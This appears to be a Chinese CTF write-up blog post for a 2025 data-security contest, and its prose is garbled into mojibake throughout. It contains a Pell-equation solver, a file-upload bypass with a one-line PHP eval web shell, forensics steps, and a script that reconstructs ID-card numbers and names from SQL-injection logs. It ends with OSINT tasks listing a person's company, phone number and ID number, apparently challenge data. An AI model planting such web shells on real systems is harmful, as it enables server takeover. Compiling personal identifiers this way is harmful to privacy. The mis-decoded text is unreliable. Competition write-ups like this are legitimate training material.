    <url>/2025/03/30/2025-%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E8%A5%BF%E5%8C%BA%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>å·®ç‚¹çˆ†é›¶äº†TATï¼Œç›´æ¥è¢«é˜Ÿå‹å¸¦é£äº†ï¼Œå®šæ¦œ 17ï¼Œé¢˜é‡å¤ªå¤§äº†å…­ä¸ªå°æ—¶ä¸‰æ³¢é¢˜ 2 ä¸ªäººè¿˜æ˜¯å¿™ä¸è¿‡æ¥www</p><p><img src="https://img.dkdun.cn/v1/2025/12/8e9b1c297157f167.png"></p><span id="more"></span><h1 id="æ•°æ®å®‰å…¨"><a href="#æ•°æ®å®‰å…¨" class="headerlink" title="æ•°æ®å®‰å…¨"></a>æ•°æ®å®‰å…¨</h1><h2 id="1ã€AS"><a href="#1ã€AS" class="headerlink" title="1ã€AS"></a>1ã€AS</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">é¢˜ç›®æè¿°ï¼šæœ¬é¢˜æ²¡æœ‰è€ƒé¢˜é™„ä»¶ï¼Œè¯·å¿½ç•¥é™„ä»¶ä¸‹è½½æŒ‰é’®ï¼ æŸä¸ªé«˜åº¦æœºå¯†çš„ç§‘ç ”é¡¹ç›®ï¼Œåªæœ‰é€šè¿‡ç‰¹å®šå£ä»¤éªŒè¯æ‰èƒ½è®¿é—®æœåŠ¡å™¨ã€‚ä¸ºäº†ä¿è¯è®¿é—®å®‰å…¨ï¼ŒæœåŠ¡å™¨è®¾è®¡äº†ä¸€ä¸ªå¤æ‚è®¤è¯ç³»ç»Ÿã€‚ç”¨æˆ·éœ€è¦æ ¹æ®æœåŠ¡å™¨æä¾›çš„æ ·ä¾‹ä»¥åŠå‚æ•°ï¼Œè¿›è¡Œæ¨å¯¼è®¡ç®—ï¼Œæœ€ç»ˆå¾—å‡ºç¬¦åˆç‰¹å®šæ¡ä»¶çš„æ•°æ®ï¼Œå°†å…¶ä½œä¸ºå£ä»¤è¾“å…¥ï¼Œè¾“å…¥åè·å–ç”¨æˆ·åä»¥åŠå¯†ç ï¼Œæäº¤<span class="hljs-built_in">md5</span>(username+password)ã€‚å¦‚username<span class="hljs-selector-attr">[abc]</span>ï¼Œpassword<span class="hljs-selector-attr">[123]</span>ï¼Œæœ€ç»ˆæäº¤ï¼š<span class="hljs-number">93</span>b3b01aa6091522f955f170680eab39ã€‚<br></code></pre></td></tr></table></figure><p>nc è¿æ¥ï¼ŒæŸ¥çœ‹ç»™å‡ºçš„ä¾‹å­</p><p><img src="https://img.dkdun.cn/v1/2025/12/433339b5cb554f98.png"></p><p>é¢˜ç›®ç»™å‡ºçš„ç­‰å·®æ•°åˆ—å’Œçš„æ¡ä»¶å¯ä»¥è½¬åŒ–ä¸ºæ–¹ç¨‹ï¼Œç„¶åé€šè¿‡å˜å½¢èƒ½å¾—åˆ°ä½©å°”æ–¹ç¨‹ï¼Œé€šè¿‡è¿åˆ†æ•°å±•å¼€æ³•æ‰¾åˆ°æœ€å°æ­£æ•´æ•°è§£ (x1,y1)ï¼Œç„¶ååˆ©ç”¨é€’æ¨å…¬å¼ç”Ÿæˆæ›´å¤§çš„è§£ï¼Œç›´åˆ° n1&#x3D;(xâˆ’1)&#x2F;2 &gt;2çš„ 5279 æ¬¡æ–¹ï¼Œå½“ n1 å’Œ n2 éƒ½å¤§äº 2 çš„ 5279 æ¬¡æ–¹æ—¶ç»ˆæ­¢å¾ªç¯ï¼Œæ‰€ä»¥è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_pell</span>(<span class="hljs-params">D</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;é€šè¿‡è¿åˆ†æ•°æ³•æ‰¾åˆ° Pell æ–¹ç¨‹ xÂ² - DyÂ² = 1 çš„æœ€å°è§£&quot;&quot;&quot;</span><br>    a0 = <span class="hljs-built_in">int</span>(D**<span class="hljs-number">0.5</span>)<br>    <span class="hljs-keyword">if</span> a0 * a0 == D:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <span class="hljs-comment"># Dä¸ºå®Œå…¨å¹³æ–¹æ•°ï¼Œæ— è§£</span><br><br>    <span class="hljs-comment"># è¿åˆ†æ•°å±•å¼€å‚æ•°åˆå§‹åŒ–</span><br>    m, d, a = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, a0<br>    x_prev, x = <span class="hljs-number">1</span>, a0<br>    y_prev, y = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># è®¡ç®—ä¸‹ä¸€æ­¥çš„è¿åˆ†æ•°å‚æ•°</span><br>        m = d * a - m<br>        d = (D - m * m) // d<br>        a = (a0 + m) // d<br><br>        <span class="hljs-comment"># æ›´æ–°xå’Œyçš„å€¼</span><br>        x_next = a * x + x_prev<br>        y_next = a * y + y_prev<br><br>        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æ»¡è¶³æ–¹ç¨‹</span><br>        <span class="hljs-keyword">if</span> x * x - D * y * y == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> (x, y)<br><br>        <span class="hljs-comment"># æ›´æ–°è¿­ä»£å˜é‡</span><br>        x_prev, x = x, x_next<br>        y_prev, y = y, y_next<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_solutions</span>(<span class="hljs-params">x1, y1, D, min_exponent=<span class="hljs-number">5279</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;ç”Ÿæˆæ»¡è¶³ n1 &gt; 2^min_exponent å’Œ n2 &gt; 2^min_exponent çš„è§£&quot;&quot;&quot;</span><br>    target = <span class="hljs-number">2</span> ** min_exponent<br>    xk, yk = x1, y1<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># è®¡ç®—å½“å‰çš„n1å’Œn2</span><br>        n1 = (xk - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span><br>        n2 = yk<br><br>        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æ»¡è¶³æ¡ä»¶</span><br>        <span class="hljs-keyword">if</span> n1 &gt; target <span class="hljs-keyword">and</span> n2 &gt; target:<br>            <span class="hljs-keyword">return</span> (n1, n2)<br><br>        <span class="hljs-comment"># é€šè¿‡é€’æ¨ç”Ÿæˆä¸‹ä¸€ä¸ªè§£</span><br>        x_next = x1 * xk + D * y1 * yk<br>        y_next = x1 * yk + y1 * xk<br>        xk, yk = x_next, y_next<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    D = <span class="hljs-number">42232</span>  <span class="hljs-comment"># Pellæ–¹ç¨‹ç³»æ•°</span><br>    min_exponent = <span class="hljs-number">0x149f</span>  <span class="hljs-comment"># å³5279</span><br><br>    <span class="hljs-comment"># å¯»æ‰¾æœ€å°è§£</span><br>    solution = solve_pell(D)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> solution:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ— è§£&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    x1, y1 = solution<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æœ€å°è§£: x=<span class="hljs-subst">&#123;x1&#125;</span>, y=<span class="hljs-subst">&#123;y1&#125;</span> â†’ n1=<span class="hljs-subst">&#123;(x1-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span>&#125;</span>, n2=<span class="hljs-subst">&#123;y1&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># ç”Ÿæˆè¶³å¤Ÿå¤§çš„è§£</span><br>    <span class="hljs-keyword">try</span>:<br>        n1, n2 = generate_solutions(x1, y1, D, min_exponent)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\næ»¡è¶³æ¡ä»¶çš„è§£:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n1 = <span class="hljs-subst">&#123;n1&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n2 = <span class="hljs-subst">&#123;n2&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nè®¡ç®—è¢«ä¸­æ–­ã€‚è§£å¯èƒ½éœ€è¦æŒ‡æ•°çº§æ—¶é—´æ‰èƒ½ç”Ÿæˆã€‚&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d0268cf7d378126c.png"></p><p>æ‹¿åˆ°ç”¨æˆ·åå’Œå¯†ç </p><p><img src="https://img.dkdun.cn/v1/2025/12/7f3c168918cb3f41.png"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">ADMIN</span>-<span class="hljs-variable constant_">JM</span><span class="hljs-symbol">:JM001x!</span><br></code></pre></td></tr></table></figure><p>å¯¹ <code>ADMIN-JM+JM001x!</code> è¿›è¡Œ md5 åŠ å¯†å¾—åˆ° flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">b<span class="hljs-number">7133</span>d<span class="hljs-number">84297</span><span class="hljs-keyword">c</span><span class="hljs-number">307</span>a<span class="hljs-number">92e70</span>d<span class="hljs-number">7727</span>f<span class="hljs-number">55</span>cbc<br></code></pre></td></tr></table></figure><h2 id="3ã€ez-upload"><a href="#3ã€ez-upload" class="headerlink" title="3ã€ez_upload"></a>3ã€ez_upload</h2><p>æ­¤å¤„æ–‡ä»¶ä¸Šä¼ å¯ä»¥é€šè¿‡åç¼€å <code>.phtml</code> è¿›è¡Œç»•è¿‡ï¼Œå½“ç„¶æ–‡ä»¶å†…å®¹å¥½åƒä¹Ÿå¯¹ php è¿›è¡Œäº†è¿‡æ»¤ï¼ŒçŸ­æœ¨é©¬å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/bcb828143f86b3f9.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/ea800c1998b22048.png"></p><p>å¾—åˆ°è·¯å¾„</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">/<span class="hljs-keyword">var</span>/www/rssss4a<br></code></pre></td></tr></table></figure><h1 id="æ•°æ®åˆ†æ"><a href="#æ•°æ®åˆ†æ" class="headerlink" title="æ•°æ®åˆ†æ"></a>æ•°æ®åˆ†æ</h1><h2 id="æº¯æºä¸å–è¯"><a href="#æº¯æºä¸å–è¯" class="headerlink" title="æº¯æºä¸å–è¯"></a>æº¯æºä¸å–è¯</h2><h3 id="ä»»åŠ¡-1"><a href="#ä»»åŠ¡-1" class="headerlink" title="ä»»åŠ¡ 1"></a>ä»»åŠ¡ 1</h3><p>ä¸‹è½½é™„ä»¶ä»¥åï¼Œç›´æ¥ä½¿ç”¨ R-STUDIO è¿›è¡ŒæŒ‚è½½å³å¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/fff6eb89d16eb130.png"></p><p>ç„¶åæ¢å¤æ–‡ä»¶ï¼Œå°†æ¢å¤çš„ docx æ–‡æ¡£æ”¹åç¼€åä¸º rarï¼Œè§£å‹ï¼Œåœ¨ <code>document.xml</code> ä¸­å‘ç° flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/2b41e8c447f1ea13.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">b1e9517338f261396511359bce56bf58<br></code></pre></td></tr></table></figure><h3 id="ä»»åŠ¡-2"><a href="#ä»»åŠ¡-2" class="headerlink" title="ä»»åŠ¡ 2"></a>ä»»åŠ¡ 2</h3><p>é€šè¿‡æŸ¥çœ‹å†…å­˜é•œåƒä¸­çš„ <code>cmdline</code> é¡¹ï¼Œå‘ç° <code>log</code> æ–‡ä»¶å¯èƒ½æ˜¯ <code>TrueCrypt</code> åŠ å¯†<br><img src="https://img.dkdun.cn/v1/2025/12/00860ec0e080102e.png"></p><p>ç›´æ¥ç”¨ passware è¿›è¡Œè§£å¯†</p><p><img src="https://img.dkdun.cn/v1/2025/12/87a528fe9365507d.png"></p><p>å¾—åˆ°æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/f58741fdd0bb1af9.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/5b439ac34f725a4e.png"></p><p>ç„¶åæˆåŠŸå¾—åˆ°æ—¥å¿—</p><p><img src="https://img.dkdun.cn/v1/2025/12/b869b1d6c7c7a37a.png"></p><p>å¾—åˆ° IP</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">114.10.143.92</span><br></code></pre></td></tr></table></figure><h3 id="ä»»åŠ¡-3"><a href="#ä»»åŠ¡-3" class="headerlink" title="ä»»åŠ¡ 3"></a>ä»»åŠ¡ 3</h3><p>æ ¹æ®æ—¥å¿— sql æ³¨å…¥å†…å®¹ï¼Œå†™å‡ºæ­£åˆ™ç„¶åå†™å‡ºè„šæœ¬å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> xpinyin <span class="hljs-keyword">import</span> Pinyin<br><br><span class="hljs-comment"># è¯»å–æ—¥å¿—æ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;access.log.1741305600.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    logs = f.readlines()<br><br><span class="hljs-comment"># åˆå§‹åŒ–æ•°æ®ç»“æ„</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;id_card&#x27;</span>: defaultdict(<span class="hljs-built_in">dict</span>),<br>    <span class="hljs-string">&#x27;name&#x27;</span>: defaultdict(<span class="hljs-built_in">dict</span>)<br>&#125;<br><br><span class="hljs-comment"># ä¼˜åŒ–åçš„æ­£åˆ™æ¨¡å¼ï¼ˆåˆå¹¶ä¸¤ç§æ³¨å…¥ç±»å‹ï¼‰</span><br>pattern = re.<span class="hljs-built_in">compile</span>(<br>    <span class="hljs-string">r&#x27;select%20(id_card|name)%20from%20info%20limit%20(\d+),1\),(\d+),1\)\)=(\d+).*?&quot; (\d+) (\d+)&#x27;</span><br>)<br><br><span class="hljs-comment"># ç»Ÿä¸€å¤„ç†æ—¥å¿—</span><br><span class="hljs-keyword">for</span> log <span class="hljs-keyword">in</span> logs:<br>    <span class="hljs-keyword">match</span> = pattern.search(log)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        data_type = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)  <span class="hljs-comment"># id_card/name</span><br>        row = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>))  <span class="hljs-comment"># è®°å½•è¡Œå·</span><br>        position = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))  <span class="hljs-comment"># å­—ç¬¦ä½ç½®</span><br>        ascii_val = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">4</span>))  <span class="hljs-comment"># ASCIIå€¼</span><br>        status_code = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">5</span>)  <span class="hljs-comment"># çŠ¶æ€ç </span><br>        res_size = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">6</span>)  <span class="hljs-comment"># å“åº”å¤§å°</span><br><br>        <span class="hljs-keyword">if</span> status_code == <span class="hljs-string">&#x27;200&#x27;</span> <span class="hljs-keyword">and</span> res_size == <span class="hljs-string">&#x27;704&#x27;</span>:<br>            <span class="hljs-comment"># å­˜å‚¨æœ‰æ•ˆå­—ç¬¦</span><br>            data[data_type][row][position] = <span class="hljs-built_in">chr</span>(ascii_val)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_records</span>(<span class="hljs-params">data_type</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;æ„å»ºå®Œæ•´æ•°æ®è®°å½•&quot;&quot;&quot;</span><br>    records = []<br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(data[data_type].keys()):<br>        positions = data[data_type][row]<br>        max_pos = <span class="hljs-built_in">max</span>(positions.keys()) <span class="hljs-keyword">if</span> positions <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>        record = <span class="hljs-string">&#x27;&#x27;</span>.join([positions.get(i, <span class="hljs-string">&#x27;?&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, max_pos + <span class="hljs-number">1</span>)])<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> record:<br>            records.append((row, record))<br>    <span class="hljs-keyword">return</span> records<br><br><br><span class="hljs-comment"># è·å–æœ‰æ•ˆæ•°æ®</span><br>id_card_records = &#123;row: val <span class="hljs-keyword">for</span> row, val <span class="hljs-keyword">in</span> build_records(<span class="hljs-string">&#x27;id_card&#x27;</span>)&#125;<br>name_records = &#123;row: val <span class="hljs-keyword">for</span> row, val <span class="hljs-keyword">in</span> build_records(<span class="hljs-string">&#x27;name&#x27;</span>)&#125;<br><br><span class="hljs-comment"># åˆå¹¶æœ‰æ•ˆè®°å½•ï¼ˆç¡®ä¿id_cardå’Œnameå¯¹åº”åŒä¸€è¡Œï¼‰</span><br>valid_pairs = []<br><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> id_card_records:<br>    <span class="hljs-keyword">if</span> row <span class="hljs-keyword">in</span> name_records:<br>        valid_pairs.append((id_card_records[row], name_records[row]))<br><br><span class="hljs-comment"># ä¸­æ–‡æ‹¼éŸ³å¤„ç†</span><br>pinyin_converter = Pinyin()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sort_key</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;ç”Ÿæˆæ‹¼éŸ³æ’åºé”®&quot;&quot;&quot;</span><br>    initials = pinyin_converter.get_initials(name, <span class="hljs-string">&#x27;&#x27;</span>).upper()  <span class="hljs-comment"># è·å–é¦–å­—æ¯ç¼©å†™</span><br>    full_pinyin = pinyin_converter.get_pinyin(name, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment"># è·å–å…¨æ‹¼</span><br>    <span class="hljs-keyword">return</span> (initials, full_pinyin)  <span class="hljs-comment"># å…ˆæŒ‰é¦–å­—æ¯æ’åºï¼Œå†æŒ‰å…¨æ‹¼æ’åº</span><br><br><br><span class="hljs-comment"># æ’åºå¤„ç†ï¼ˆå¤šçº§æ’åºï¼‰</span><br>sorted_pairs = <span class="hljs-built_in">sorted</span>(<br>    valid_pairs,<br>    key=<span class="hljs-keyword">lambda</span> x: (get_sort_key(x[<span class="hljs-number">1</span>]), x[<span class="hljs-number">1</span>])  <span class="hljs-comment"># å…ˆæŒ‰æ‹¼éŸ³é¦–å­—æ¯ï¼Œå†æŒ‰å…¨æ‹¼ï¼Œæœ€åæŒ‰å§“å</span><br>)<br><br><span class="hljs-comment"># æ‹¼æ¥èº«ä»½è¯å·å¹¶è®¡ç®—MD5</span><br>id_card_chain = <span class="hljs-string">&#x27;&#x27;</span>.join([pair[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> pair <span class="hljs-keyword">in</span> sorted_pairs])<br>md5_result = hashlib.md5(id_card_chain.encode()).hexdigest().lower()<br><br><span class="hljs-comment"># è¾“å‡ºç»“æœ</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æœ€ç»ˆæ’åºçš„èº«ä»½è¯å·åºåˆ—:&quot;</span>)<br><span class="hljs-built_in">print</span>(id_card_chain)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nMD5å“ˆå¸Œå€¼:&quot;</span>, md5_result)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a5c3e69e4cf0c10b.png"></p><p>å¾—åˆ°æœ€ç»ˆç­”æ¡ˆ</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">060</span>b534ffb5c4a487be36cca<span class="hljs-number">98165e73</span><br></code></pre></td></tr></table></figure><h2 id="æ•°æ®ç¤¾å·¥"><a href="#æ•°æ®ç¤¾å·¥" class="headerlink" title="æ•°æ®ç¤¾å·¥"></a>æ•°æ®ç¤¾å·¥</h2><h3 id="2ã€å¼ åå¼ºçš„å…¬å¸åç§°"><a href="#2ã€å¼ åå¼ºçš„å…¬å¸åç§°" class="headerlink" title="2ã€å¼ åå¼ºçš„å…¬å¸åç§°"></a>2ã€å¼ åå¼ºçš„å…¬å¸åç§°</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[!important]<br><br><span class="hljs-bullet">-</span> å¼ æŸå–œæ¬¢åœ¨å…¬å¸æ”¶å¿«é€’ï¼Œåœ°å€ä¸€èˆ¬ä¸ºå·¥ä½œåœ°+å…¬å¸çš„ç®€å†™ï¼Œå¦‚<span class="hljs-code">`æŸæŸè½¯ä»¶å›­å‡¤å‡°ä¼ åª’`</span><br><span class="hljs-bullet">-</span> å‚è€ƒçˆ¬å–çš„ä¼ä¸šå·¥å•†ä¿¡æ¯ï¼ŒæŸ¥è¯¢å…¬å¸çš„æ­£å¼åç§°<br></code></pre></td></tr></table></figure><p>åœ¨çˆ¬å–çš„ç½‘é¡µä¸­æˆåŠŸæ‰¾åˆ°äº†å…¶å…¬å¸åœ°å€</p><p><img src="https://img.dkdun.cn/v1/2025/12/6f486ea4d89ba1e7.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">æ±Ÿè‹åšæ—ç§‘æŠ€æœ‰é™å…¬å¸<br></code></pre></td></tr></table></figure><h3 id="3ã€å¼ åå¼ºçš„æ‰‹æœºå·"><a href="#3ã€å¼ åå¼ºçš„æ‰‹æœºå·" class="headerlink" title="3ã€å¼ åå¼ºçš„æ‰‹æœºå·"></a>3ã€å¼ åå¼ºçš„æ‰‹æœºå·</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-meta">[!important]</span><br><br><span class="hljs-bullet">- </span>å¼ æŸä¸ºä¼ä¸šçš„å¯¹å¤–è”ç»œäºº<br><span class="hljs-bullet">- </span>å‡è®¾å¼ åå¼ºä»…æœ‰ä¸€ä¸ªæ‰‹æœºå·ï¼Œæ‰‹æœºå·ä¸º11ä½çš„æ˜æ–‡æ•°å­—<br></code></pre></td></tr></table></figure><p>åŒæ ·åœ¨ç½‘é¡µä¸­å¾—åˆ°äº†æ‰‹æœºå·</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">13891889377</span><br></code></pre></td></tr></table></figure><h3 id="4ã€å¼ åå¼ºçš„èº«ä»½è¯å·"><a href="#4ã€å¼ åå¼ºçš„èº«ä»½è¯å·" class="headerlink" title="4ã€å¼ åå¼ºçš„èº«ä»½è¯å·"></a>4ã€å¼ åå¼ºçš„èº«ä»½è¯å·</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[!important]</span><br><br>- åŠç†æ‰‹æœºå·æˆ–ç›¸å…³ä¸šåŠ¡éœ€è¦ç•™å­˜èº«ä»½è¯<br></code></pre></td></tr></table></figure><p>åœ¨çˆ¬å–çš„ç½‘é¡µä¸­å¦å¤–çš„ç½‘é¡µä¸­æ‰¾åˆ°å…¶èº«ä»½è¯å·ç </p><p><img src="https://img.dkdun.cn/v1/2025/12/18f07e64cedfafe6.png"></p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tp"><span class="hljs-number">61050119980416547</span><span class="hljs-keyword">X</span><br></code></pre></td></tr></table></figure><h3 id="5ã€å¼ åå¼ºçš„è½¦ç‰Œå·"><a href="#5ã€å¼ åå¼ºçš„è½¦ç‰Œå·" class="headerlink" title="5ã€å¼ 